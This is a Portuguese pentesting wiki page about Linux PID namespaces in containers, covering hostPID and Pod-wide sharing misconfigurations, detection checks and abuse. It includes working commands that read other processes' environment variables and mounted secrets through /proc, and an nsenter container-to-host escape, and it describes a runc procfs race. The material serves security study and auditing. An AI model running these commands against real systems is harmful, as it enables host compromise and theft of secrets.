# Namespace de PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Visão geral

O namespace de PID controla como os processos são numerados e quais processos são visíveis. É por isso que um container pode ter seu próprio PID 1 mesmo não sendo uma máquina real. Dentro do namespace, o workload vê o que parece ser uma árvore de processos local. Fora do namespace, o host ainda vê os PIDs reais do host e todo o panorama de processos.<sup>[[3]](#references)</sup>

Do ponto de vista de segurança, o namespace de PID é importante porque a visibilidade dos processos é valiosa. Quando um workload consegue ver processos do host, ele pode conseguir observar nomes de serviços, argumentos da linha de comando, secrets passados nos argumentos dos processos, estado derivado do ambiente por meio de `/proc` e possíveis alvos de entrada em namespaces. Se ele puder fazer mais do que apenas ver esses processos, por exemplo, enviando sinais ou usando ptrace nas condições adequadas, o problema se torna muito mais grave.

## Operação

Um novo namespace de PID começa com sua própria numeração interna de processos. O primeiro processo criado dentro dele se torna o PID 1 do ponto de vista do namespace, o que também significa que ele recebe semântica especial semelhante à de init para filhos órfãos e comportamento de sinais. Isso explica muitas particularidades de containers relacionadas a processos init, coleta de processos zombie e ao motivo pelo qual pequenos wrappers de init às vezes são usados em containers.<sup>[[3]](#references)</sup>

Os namespaces de PID formam uma hierarquia. Um processo em um namespace ancestral pode endereçar descendentes usando o PID atribuído nesse ancestral, mas um descendente não pode endereçar tarefas exclusivas do ancestral por meio de syscalls comuns baseadas em PID nem usar `setns()` para subir até um namespace de PID ancestral. Um procfs pertencente ao ancestral e deliberadamente exposto ao descendente ainda pode causar um leak da visão de processos do ancestral. Além disso, ingressar em um namespace de PID com `setns()` altera o namespace para **filhos futuros**, não para o próprio chamador; por isso, as ferramentas fazem fork depois de ingressar. Uma montagem de procfs mantém a visão de PID do processo que a montou, razão pela qual criar um procfs novo após `unshare(CLONE_NEWPID)` é relevante para a segurança, e não apenas uma questão cosmética.<sup>[[3]](#references)</sup>

A lição importante de segurança é que um processo pode parecer isolado porque vê apenas sua própria árvore de PIDs, mas esse isolamento pode ser removido deliberadamente. O Docker expõe isso por meio de `--pid=host`, enquanto o Kubernetes faz isso usando `hostPID: true`. Quando o container ingressa no namespace de PID do host, o workload vê os processos do host diretamente, e muitos caminhos de ataque posteriores se tornam muito mais realistas.

## Laboratório

Para criar manualmente um namespace de PID:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
O shell agora vê uma visualização privada dos processos. A flag `--mount-proc` é importante porque monta uma instância de procfs que corresponde ao novo namespace de PID, tornando a lista de processos coerente a partir de dentro.<sup>[[3]](#references)</sup>

Para comparar o comportamento dos containers:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
A diferença é imediata e fácil de entender, e é por isso que este é um bom primeiro lab para os leitores.

## Runtime Usage

Containers normais no Docker, Podman, containerd e CRI-O recebem seu próprio PID namespace. Os containers do Kubernetes normalmente têm visualizações de PID separadas; `shareProcessNamespace: true` cria deliberadamente uma visualização em todo o Pod.<sup>[[4]](#references)</sup> Em contrapartida, `hostPID: true` seleciona o PID namespace do node. Os ambientes LXC/Incus dependem da mesma primitiva do kernel, embora os casos de uso de system containers possam expor árvores de processos mais complexas e incentivar mais atalhos de debugging.

A mesma regra se aplica em todos os lugares: se o runtime optou por não isolar o PID namespace, isso representa uma redução deliberada do limite do container.

## Misconfigurations

A misconfiguration clássica é o compartilhamento do PID do host. As equipes frequentemente o justificam por conveniência de debugging, monitoramento ou gerenciamento de serviços, mas ele deve sempre ser tratado como uma exceção de segurança significativa. Mesmo que o container não tenha uma primitiva imediata de escrita sobre os processos do host, apenas a visibilidade pode revelar muitas informações sobre o sistema. Quando capabilities como `CAP_SYS_PTRACE` ou acesso útil ao procfs são adicionados, o risco aumenta significativamente.

Outro erro é presumir que, como o workload não pode matar ou fazer ptrace em processos do host por padrão, o compartilhamento do PID do host é inofensivo. Essa conclusão ignora o valor da enumeração, a disponibilidade de alvos para entrada em namespaces e a forma como a visibilidade de PID se combina com outros controles enfraquecidos.

### Kubernetes Pod-wide process sharing

`shareProcessNamespace: true` é diferente de `hostPID`: ele expõe os processos dos **outros containers no mesmo Pod**, não os processos do node. Um sidecar comprometido ou um container de debugging pode então enumerar as command lines e os dados de ambiente dos containers irmãos, sujeito às verificações de acesso do procfs, enviar sinais quando as credenciais permitirem e percorrer o filesystem de um container irmão por meio de `/proc/<pid>/root`. O Kubernetes alerta explicitamente que os secrets da command line/ambiente e os filesystems dos containers ficam protegidos apenas pelas permissões Unix aplicáveis.<sup>[[4]](#references)</sup>

Revisão útil no lado do cluster:
```bash
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
[.metadata.namespace,.metadata.name,
(.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```
De um container comprometido em um namespace PID abrangente do Pod, primeiro teste o acesso real em vez de presumir que a visibilidade equivale à legibilidade:<sup>[[4]](#references)</sup>
```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```
## Abuso

Se o namespace de PID do host for compartilhado, um atacante poderá inspecionar processos do host, coletar argumentos de processos, identificar serviços interessantes, localizar PIDs candidatos para `nsenter` ou combinar a visibilidade dos processos com privilégios relacionados a `ptrace` para interferir em workloads do host ou de hosts vizinhos. Em alguns casos, simplesmente visualizar o processo de longa duração correto é suficiente para reformular o restante do plano de ataque.

A primeira etapa prática é sempre confirmar se os processos do host estão realmente visíveis:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Uma vez que os PIDs do host estejam visíveis, os argumentos dos processos e os alvos de entrada em namespaces frequentemente se tornam a fonte de informação mais útil:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Se o `nsenter` estiver disponível e houver privilégios suficientes, teste se um processo visível do host pode ser usado como uma ponte de namespace:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Mesmo quando a entrada é bloqueada, o compartilhamento de PID do host já é valioso porque revela o layout de serviços, os componentes de runtime e processos privilegiados candidatos para atingir em seguida. A visibilidade de PID, por si só, **não** concede permissão para enviar sinais, rastrear, ler entradas sensíveis de `/proc/<pid>` ou ingressar nos outros namespaces do alvo; credenciais, dumpability, capabilities no user namespace proprietário do namespace do alvo, políticas do Yama/LSM e seccomp ainda são relevantes.<sup>[[3]](#references)</sup> Consulte [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) para exemplos de process-injection.

A visibilidade dos PIDs do host também torna o abuso de descritores de arquivo mais realista. Se um processo privilegiado do host ou uma workload vizinha tiver um arquivo ou socket sensível aberto, o atacante poderá conseguir inspecionar `/proc/<pid>/fd/` e acessar o objeto subjacente, dependendo das verificações no estilo ptrace, da ownership, das opções de montagem do procfs, do tipo de objeto e do modelo do serviço-alvo. Ver apenas um symlink de FD não significa que ele possa ser aberto, e um socket não pode ser duplicado simplesmente abrindo seu symlink `/proc/<pid>/fd/N`. Para a primitiva distinta `pidfd_getfd()` e suas verificações de autorização, consulte [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Esses comandos são úteis porque respondem se `hidepid=1` ou `hidepid=2` está reduzindo a visibilidade entre processos e se descritores obviamente interessantes, como arquivos secretos abertos, logs ou sockets Unix, estão visíveis de alguma forma.

### Exemplo completo: PID do host + `nsenter`

O compartilhamento de PID do host se torna um escape direto do host quando o processo também possui privilégios suficientes para ingressar nos namespaces do host:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Se o comando for bem-sucedido, o processo do container agora está sendo executado nos namespaces de mount, UTS, network, IPC e PID do host. O impacto é o comprometimento imediato do host.

Mesmo quando o próprio `nsenter` está ausente, o mesmo resultado pode ser alcançado por meio do binário do host, se o sistema de arquivos do host estiver montado:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Notas recentes de runtime

Alguns ataques relevantes para PID namespace não são configurações incorretas tradicionais de `hostPID: true`, mas bugs de implementação do runtime relacionados à forma como as proteções do procfs são aplicadas durante a configuração do container.

#### Race de `maskedPaths` para o procfs do host

Em versões vulneráveis do `runc`, atacantes capazes de controlar a imagem do container ou a carga de trabalho de `runc exec` poderiam explorar uma race na fase de masking, substituindo o `/dev/null` no lado do container por um symlink para um caminho sensível do procfs, como `/proc/sys/kernel/core_pattern`. Se a race fosse bem-sucedida, o bind mount do caminho mascarado poderia ser aplicado ao destino errado e expor knobs do procfs global do host ao novo container.<sup>[[1]](#references)</sup>

Comando útil para revisão:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Isso é importante porque o impacto final pode ser o mesmo que uma exposição direta do procfs: `core_pattern` ou `sysrq-trigger` gravável, seguido de execução de código no host ou denial of service. As páginas dedicadas a [masked paths](../masked-paths.md) e [sensitive host mounts](../../sensitive-host-mounts.md) abrangem a superfície de ataque geral do procfs sem duplicá-la aqui.

#### Injeção de namespace com `insject`

Ferramentas de injeção de namespace, como `insject`, mostram que a interação com PID namespace nem sempre exige entrar previamente no namespace alvo antes da criação do processo. Um auxiliar pode se anexar posteriormente, usar `setns()` e executar mantendo a visibilidade do espaço de PIDs alvo:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Esse tipo de técnica é importante principalmente para debugging avançado, offensive tooling e workflows de post-exploitation nos quais o contexto do namespace precisa ser associado depois que o runtime já inicializou o workload.

### Padrões Relacionados de Abuso de FD

Dois padrões merecem ser destacados explicitamente quando os PIDs do host estão visíveis. Primeiro, um processo privilegiado pode manter um file descriptor sensível aberto durante `execve()` porque ele não foi marcado com `O_CLOEXEC`. Segundo, serviços podem passar file descriptors por Unix sockets usando `SCM_RIGHTS`. Em ambos os casos, o objeto interessante não é mais o pathname, mas o handle já aberto que um processo com menor privilégio pode herdar ou receber.

Isso é importante em operações com containers porque o handle pode apontar para `docker.sock`, um log privilegiado, um arquivo de secrets do host ou outro objeto de alto valor, mesmo quando o próprio path não é diretamente acessível a partir do filesystem do container.

## Verificações

O objetivo desses comandos é determinar se o processo possui uma visão privada de PIDs ou se já consegue enumerar um panorama de processos muito mais amplo.
```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```
O que é interessante aqui:<sup>[[3]](#references)</sup>

- Se a lista de processos contiver serviços óbvios do host, o compartilhamento de PID do host provavelmente já está ativo.
- Ver apenas uma pequena árvore local do container é o baseline normal; ver `systemd`, `dockerd` ou daemons não relacionados não é.
- `NSpid` pode expor o mapeamento de PID entre namespaces aninhados. O valor mais à esquerda é relativo ao namespace de PID associado à montagem do procfs, seguido pelos valores dos namespaces sucessivamente aninhados.
- `readlink /proc/self/ns/pid`, por si só, não pode provar `hostPID`: um container isolado também tem um inode válido de namespace de PID. Correlacione-o com a lista de processos, a montagem do procfs, a configuração do runtime e um inode de namespace no host, quando disponível.
- Assim que os PIDs do host estiverem visíveis, até mesmo informações de processos somente para leitura se tornam úteis para reconnaissance.

Se você descobrir um container executando com compartilhamento de PID do host, não trate isso como uma diferença cosmética. Isso representa uma grande mudança no que o workload pode observar e potencialmente afetar.



## References

- [1] [aviso de segurança do runc: escape de container via abuso de "masked path" devido a condições de corrida em montagens (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Lançamento de ferramenta – insject: um injetor de Linux Namespace](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Livro Linux man-pages 6.19](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Compartilhar o Process Namespace entre Containers em um Pod](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
{{#include ../../../../../banners/hacktricks-training.md}}
